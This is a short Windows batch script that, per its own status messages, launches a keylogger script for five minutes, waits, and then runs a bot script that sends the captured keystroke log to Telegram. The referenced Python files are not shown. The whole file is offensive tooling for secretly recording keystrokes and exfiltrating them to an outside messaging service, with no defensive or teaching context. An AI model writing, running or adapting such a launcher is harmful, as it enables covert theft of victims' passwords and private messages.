@echo off
echo [*] Starting keylogger (5 min)...
python reader.py

echo [*] Waiting 310 seconds for logging to complete...
timeout /t 310 >nul

echo [*] Sending log to Telegram...
python bot.py

echo [*] Done.
